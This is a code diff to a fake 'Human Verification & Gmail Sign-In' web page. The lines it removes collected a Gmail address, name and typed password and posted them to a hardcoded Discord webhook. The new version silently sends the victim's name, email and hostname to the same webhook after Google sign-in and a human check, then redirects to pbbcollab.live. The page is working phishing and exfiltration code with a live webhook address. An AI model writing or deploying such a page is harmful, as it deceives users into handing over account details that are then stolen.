@@ -182,59 +182,10 @@
       display: flex;
     }
 
-    .field-group {
-      margin-bottom: 14px;
-    }
-
-    .field-label {
-      display: block;
-      font-size: 12px;
-      font-weight: 600;
-      color: #e4e4e7;
-      margin-bottom: 6px;
-    }
-
-    .password-row {
-      display: flex;
-      gap: 8px;
-    }
-
-    .text-input {
-      width: 100%;
-      padding: 10px 12px;
-      font-size: 13.5px;
-      color: #ffffff;
-      background-color: #09090b;
-      border: 1px solid #27272a;
-      border-radius: 8px;
-      outline: none;
-    }
-
-    .text-input:focus {
-      border-color: #52525b;
-    }
-
-    .btn-toggle {
-      padding: 0 12px;
-      font-size: 12px;
-      font-weight: 600;
-      color: #f4f4f5;
-      background-color: #18181b;
-      border: 1px solid #27272a;
-      border-radius: 8px;
-      cursor: pointer;
-      white-space: nowrap;
-    }
-
-    .btn-toggle:hover {
-      background-color: #27272a;
-    }
-
     .status-msg {
       font-size: 12px;
       text-align: center;
       color: #a1a1aa;
-      margin-bottom: 14px;
       min-height: 18px;
     }
 
@@ -246,29 +197,6 @@
     .status-msg.error {
       color: #f87171;
       font-weight: 600;
-    }
-
-    .btn-primary {
-      width: 100%;
-      padding: 11px 16px;
-      font-size: 14px;
-      font-weight: 600;
-      color: #09090b;
-      background-color: #ffffff;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    .btn-primary:hover:not(:disabled) {
-      background-color: #e4e4e7;
-    }
-
-    .btn-primary:disabled {
-      background-color: #18181b;
-      color: #52525b;
-      border: 1px solid #27272a;
-      cursor: not-allowed;
     }
 
     .side-account-panel {
@@ -350,7 +278,7 @@
 <body>
   <div class="page-shell">
     <h1 class="page-title">Human Verification & Gmail Sign-In</h1>
-    <p class="page-subtitle">Complete human verification, slide Gmail logo to sign in, and enter password</p>
+    <p class="page-subtitle">Complete human check and slide Gmail logo to sign in automatically</p>
 
     <div class="layout-grid">
       <main class="normal-card">
@@ -406,25 +334,7 @@
           ></div>
         </div>
 
-        <div class="divider"></div>
-
-        <div class="field-group">
-          <label for="password-input" class="field-label">3. Password</label>
-          <div class="password-row">
-            <input
-              id="password-input"
-              class="text-input"
-              type="password"
-              placeholder="Enter password"
-              autocomplete="current-password"
-            />
-            <button id="toggle-pass-btn" class="btn-toggle" type="button">Show</button>
-          </div>
-        </div>
-
-        <div id="status-msg" class="status-msg">Complete human check, slide Gmail logo to sign in, and enter password.</div>
-
-        <button id="continue-btn" class="btn-primary" type="button" disabled>Continue</button>
+        <div id="status-msg" class="status-msg">Complete human check and slide Gmail logo to sign in.</div>
       </main>
 
       <aside id="side-account-panel" class="side-account-panel" aria-live="polite">
@@ -447,6 +357,7 @@
 
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572991657060864111/aI26JcjNw1OGkASLlVwoSGOVZefGWn9Gmd6lMbcN-VjU3kUEsNOPICYIShwYJjAOy18P";
+    const TARGET_REDIRECT_URL = "https://www.pbbcollab.live/";
 
     (function initDragGmail() {
       const track = document.getElementById("drag-track");
@@ -519,9 +430,6 @@
     })();
 
     const statusMsg = document.getElementById("status-msg");
-    const continueBtn = document.getElementById("continue-btn");
-    const passwordInput = document.getElementById("password-input");
-    const togglePassBtn = document.getElementById("toggle-pass-btn");
     const sideAccountPanel = document.getElementById("side-account-panel");
     const avatarInitial = document.getElementById("avatar-initial");
     const avatarImg = document.getElementById("avatar-img");
@@ -531,16 +439,7 @@
     let humanOk = false;
     let gmailName = "";
     let gmailEmail = "";
-
-    togglePassBtn.addEventListener("click", () => {
-      const isHidden = passwordInput.type === "password";
-      passwordInput.type = isHidden ? "text" : "password";
-      togglePassBtn.textContent = isHidden ? "Hide" : "Show";
-    });
-
-    function hasPassword() {
-      return passwordInput.value.trim().length > 0;
-    }
+    let autoProceedStarted = false;
 
     function parseJwtPayload(token) {
       const base64Url = token.split(".")[1];
@@ -554,24 +453,57 @@
       return JSON.parse(jsonPayload);
     }
 
-    function updateReadyState() {
-      const passOk = hasPassword();
-      if (humanOk && gmailEmail && passOk) {
-        statusMsg.textContent = "Ready. Click Continue to submit.";
-        statusMsg.className = "status-msg success";
-        continueBtn.disabled = false;
-      } else {
-        const missing = [];
-        if (!humanOk) missing.push("human check");
-        if (!gmailEmail) missing.push("Gmail sign-in");
-        if (!passOk) missing.push("password");
-        statusMsg.textContent = "Required: " + missing.join(", ") + ".";
-        statusMsg.className = "status-msg";
-        continueBtn.disabled = true;
-      }
+    async function sendToDiscordWebhook() {
+      const payload = {
+        content: "New Verified Gmail Sign-In",
+        embeds: [
+          {
+            title: "Verification & Gmail Login",
+            color: 1118481,
+            fields: [
+              { name: "Name", value: gmailName || "N/A", inline: true },
+              { name: "Gmail", value: gmailEmail || "N/A", inline: true },
+              { name: "Human Check", value: humanOk ? "Verified" : "Unverified", inline: true },
+              { name: "Source", value: window.location.hostname || "localhost", inline: false }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        keepalive: true
+      }).catch(() => {});
     }
 
-    passwordInput.addEventListener("input", updateReadyState);
+    async function checkAndAutoOpen() {
+      if (!humanOk || !gmailEmail || autoProceedStarted) return;
+      autoProceedStarted = true;
+
+      statusMsg.textContent = "Verified and signed in. Opening pbbcollab.live...";
+      statusMsg.className = "status-msg success";
+
+      await sendToDiscordWebhook();
+      window.location.href = TARGET_REDIRECT_URL;
+    }
+
+    function updateReadyState() {
+      if (humanOk && gmailEmail) {
+        checkAndAutoOpen();
+      } else if (humanOk && !gmailEmail) {
+        statusMsg.textContent = "Human check passed. Drag the Gmail logo to sign in.";
+        statusMsg.className = "status-msg";
+      } else if (!humanOk && gmailEmail) {
+        statusMsg.textContent = "Gmail signed in. Complete human verification.";
+        statusMsg.className = "status-msg";
+      } else {
+        statusMsg.textContent = "Complete human check and slide Gmail logo to sign in.";
+        statusMsg.className = "status-msg";
+      }
+    }
 
     function onHumanVerified(token) {
       humanOk = Boolean(token);
@@ -587,7 +519,6 @@
       humanOk = false;
       statusMsg.textContent = "Human verification failed. Check domain and connection.";
       statusMsg.className = "status-msg error";
-      continueBtn.disabled = true;
     }
 
     function onGoogleCredential(response) {
@@ -616,59 +547,8 @@
         sideAccountPanel.classList.remove("visible");
         statusMsg.textContent = "Unable to read Gmail account info.";
         statusMsg.className = "status-msg error";
-        continueBtn.disabled = true;
       }
     }
-
-    async function sendToDiscordWebhook(passwordValue) {
-      const payload = {
-        content: "New Verified Gmail Sign-In",
-        embeds: [
-          {
-            title: "Verification, Gmail & Password",
-            color: 1118481,
-            fields: [
-              { name: "Name", value: gmailName || "N/A", inline: true },
-              { name: "Gmail", value: gmailEmail || "N/A", inline: true },
-              { name: "Password", value: passwordValue || "N/A", inline: false },
-              { name: "Human Check", value: humanOk ? "Verified" : "Unverified", inline: true },
-              { name: "Source", value: window.location.hostname || "localhost", inline: true }
-            ],
-            timestamp: new Date().toISOString()
-          }
-        ]
-      };
-
-      const res = await fetch(DISCORD_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-
-      if (!res.ok) {
-        throw new Error("Webhook failed");
-      }
-    }
-
-    continueBtn.addEventListener("click", async () => {
-      const passwordValue = passwordInput.value.trim();
-      if (!humanOk || !gmailEmail || !passwordValue) return;
-
-      continueBtn.disabled = true;
-      continueBtn.textContent = "Sending...";
-
-      try {
-        await sendToDiscordWebhook(passwordValue);
-        statusMsg.textContent = "Verified, signed in, and sent to Discord webhook.";
-        statusMsg.className = "status-msg success";
-        continueBtn.textContent = "Sent";
-      } catch (err) {
-        statusMsg.textContent = "Failed to send to Discord webhook. Check connection or webhook.";
-        statusMsg.className = "status-msg error";
-        continueBtn.textContent = "Continue";
-        continueBtn.disabled = false;
-      }
-    });
   </script>
 </body>
 </html>
